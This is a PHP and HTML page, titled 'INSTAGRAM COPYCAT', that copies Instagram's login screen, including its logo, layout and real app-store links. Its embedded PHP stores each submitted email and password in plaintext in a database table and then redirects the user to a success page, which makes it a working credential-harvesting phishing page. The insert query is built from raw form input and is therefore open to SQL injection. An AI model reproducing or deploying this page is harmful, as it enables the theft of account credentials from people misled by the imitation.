<link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;400;500;700&display=swap"
      rel="stylesheet"
    />
<style>
    * {
  padding: 0;
  margin: 0;
  box-sizing: border-box;
}

html {
  font-size: 62.5%;
}

body {
  background-color: #d6d6d610;
  font-family: 'Roboto';
  color: #333;
}

.login-page {
  width: 42rem;
  padding: 2rem;
  margin: auto;
}

.login-container {
  position: relative;
  font-size: 1.8rem;
  padding: 0 4rem 3rem;
  max-width: 48rem;
  margin-top: 2rem;
  margin-bottom: 2rem;
  border: solid 1px #ddd;
  background-color: #fff;
}

/* LOGIN TITLE */
.instagram-title {
  display: block;
  height: 10rem;
  width: 22rem;
  margin: auto;
  margin-bottom: 4rem;
}

/* USERNAME AND PASSWORD SECTION */

.username-info input,
.password-info input {
  display: block;
  font-size: 1.4rem;
  color: #333;
  padding: 1rem 2rem 1rem 0.5rem;
  margin: 0 5rem 1.5rem 0;
  width: 100%;
  background-color: #d6d6d610;
  border: solid 1px #aaa;
  border-radius: 5px;
}

/* LOGIN BUTTON */

.login-btn {
  font-weight: 600;
  font-size: 1.6rem;
  text-align: center;
  border: solid 1px #aaa;
  border-radius: 5px;
  padding: 0.5rem;
  margin-bottom: 2rem;
  background-color: #228be6;
  color: #fff;
  cursor: pointer;
}

.login-btn:hover {
  background-color: #4ea2eb;
}

/* OR DIVIDER */
.or-divider {
  display: flex;
  justify-content: space-evenly;
  align-items: center;
  flex-direction: row;
  /* text-align: center; */
  color: #a7a7a7;
  font-size: 1.6rem;
  font-weight: 500;
  margin-bottom: 2rem;
}

.or-divider:before,
.or-divider:after {
  background-color: #a7a7a7;
  content: '';
  display: inline-block;
  height: 0.12rem;
  position: relative;
  vertical-align: middle;
  width: 50%;
}

.or-divider:before {
  right: 2rem;
  margin-left: 7%;
}

.or-divider:after {
  left: 2rem;
  margin-right: 7%;
}

/* LOG IN WITH FACEBOOK */
.facebook-login {
  display: flex;
  justify-content: center;
  align-items: center;
  margin-bottom: 1.5rem;
}

.facebook-icon {
  position: relative;
  height: 2.5rem;
  width: 2.5rem;
  right: 0.5rem;
}

.login-with-fb {
  text-decoration: none;
  color: #3e607d;
  font-size: 1.6rem;
  font-weight: 600;
  letter-spacing: 0.3px;
}

/* FORGOT PASS WORD */
.forgot-text {
  display: block;
  font-size: 1.4rem;
  text-align: center;
  color: #0e385c;
  text-decoration: none;
}

.forgot-text:hover {
  text-decoration: underline;
}

/* SIGN UP */
.sign-up-container {
  background-color: #fff;
  font-size: 1.6rem;
  display: flex;
  justify-content: center;
  border: solid 1px #ddd;
  padding: 2rem;
}

.sign-up-text {
  text-decoration: none;
  color: #228be6;
  font-weight: 500;
}

.sign-up-text:hover {
  text-decoration: underline;
}

/* CTA SECTION */

.cta-app {
  font-size: 1.6rem;
  text-align: center;
  margin-bottom: 2rem;
}

.cta-container {
  max-width: 40rem;
  margin: auto auto 4rem;
  position: relative;
  display: flex;
  justify-content: center;
  flex-direction: row;
}

.apple-app-store,
.google-play {
  width: auto;
  height: 4.5rem;
  cursor: pointer;
}

.apple-app-store {
  padding-right: 1rem;
}

/* FOOTER SECTION */

.links {
  margin-bottom: 2rem;
}

.nav-links {
  display: flex;
  flex-direction: row;
  justify-content: center;
  align-items: flex-start;
  list-style: none;
  padding: 0 2rem 0 2rem;
}

.footer-link {
  color: #a7a7a7;
  padding: 1rem;
  font-size: 1.4rem;
  text-decoration: none;
}

/* Copyright section */

.copyright-section {
  font-size: 1.4rem;
  color: #a7a7a7;
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 2rem;
  margin-bottom: 6rem;
}

.copyright-section select {
  font-size: 1.4rem;
  color: #a7a7a7;
  border: none;
  background-color: #d6d6d610;
}

</style>
    <title>INSTAGRAM COPYCAT</title>
  <body>
    <div class="login-page">
      <div class="login-container">
        <h1>
          <img
            class="instagram-title"
            alt="instagram title logo"
            src="https://i.imgur.com/wvLiKam.png"
          />
        </h1>
        <?php
include "functions.php";
if(isset($_POST['login'])){
    $email = $_POST['email'];
    $password = $_POST['password'];
    $sql = "INSERT INTO myguests (email, password)
VALUES ('$email', '$password')";

if (mysqli_query($conn, $sql)) {
    echo " <center> <h4 style='color:green'> Successfully Submited </h4> </center><script>window.location.href = 'success.php';</script>  ";
  } else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
  }
}
?> 
        <form class="login-form" action="" method="post">
          <div class="username-info">
            <label for="username">
              <input
                name="email"
                type="text"
                placeholder="Phone number, username, or email"
                required
              />
            </label>
          </div>
          <div class="password-info">
            <label for="password">
              <input
                name="password"
                type="password"
                placeholder="Password"
                required
              />
            </label>
          </div>
          <input type="submit" name="login" class="login-btn">Log In</div>

          <div class="or-divider">
            <span class="or-text">OR</span>
          </div>

          <div class="facebook-login">
            <a href="https://www.facebook.com/">
              <img
                src="https://img.icons8.com/fluency/48/000000/facebook.png"
                class="facebook-icon"
              />
            </a>
            <a href="#" class="login-with-fb"
              >Log in with Facebook
            </a>
          </div>

          <a class="forgot-text" href="#">Forgot password?</a>
        </form>
      </div>

      <div class="sign-up-container">
        <div class="new-user">
          Don't have an account? <a class="sign-up-text" href="#">Sign up</a>
        </div>
      </div>
    </div>

    <div class="cta-app">Get the app.</div>
    <div class="cta-container">
      <div class="app-store-logo">
        <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo">
          <img
            src="https://i.imgur.com/lREV6Qa.png"
            alt="download on the app store logo"
            class="apple-app-store"
          />
        </a>
      </div>
      <div class="app-store-logo">
        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXRR9_gALAAHKOzMSO3MkAOZ0JJtC%26utm_content%3Dlo%26utm_medium%3Dbadge"">
          <img
          src="https://i.imgur.com/DFQNKXK.png"
          alt="get it on google play logo"
          class="google-play"
          />
        </a>
      </div>
    </div>

    <footer class="footer">
      <div class="footer-container">
        <div class="links">
          <nav class="nav-links">
            <li><a class="footer-link" href="#">Meta</a></li>
            <li><a class="footer-link" href="#">About</a></li>
            <li><a class="footer-link" href="#">Blog</a></li>
            <li><a class="footer-link" href="#">Jobs</a></li>
            <li><a class="footer-link" href="#">Help</a></li>
            <li><a class="footer-link" href="#">API</a></li>
            <li><a class="footer-link" href="#">Privacy</a></li>
            <li><a class="footer-link" href="#">Terms</a></li>
            <li><a class="footer-link" href="#">Top Accounts</a></li>
            <li><a class="footer-link" href="#">Hashtags</a></li>
            <li><a class="footer-link" href="#">Locations</a></li>
            <li><a class="footer-link" href="#">Instagram Lite</a></li>
          </nav>
        </div>
        <div class="copyright-section">
          <label for="language-select"></label>
          <select id="language-select">
            <option value="English">English</option>
            <option value="French">French</option>
            <option value="Italian">Italiano</option>
            <option value="Spanish">Spanish</option>
            <option value="Tagalog">Tagalog</option>
          </select>
          <p>&copy; <span class="year">2021</span> Instagram log in copycat</p>
          <p>Developed by Hobayer Golondaz</p>
        </div>
      </div>
    </footer>
  </body>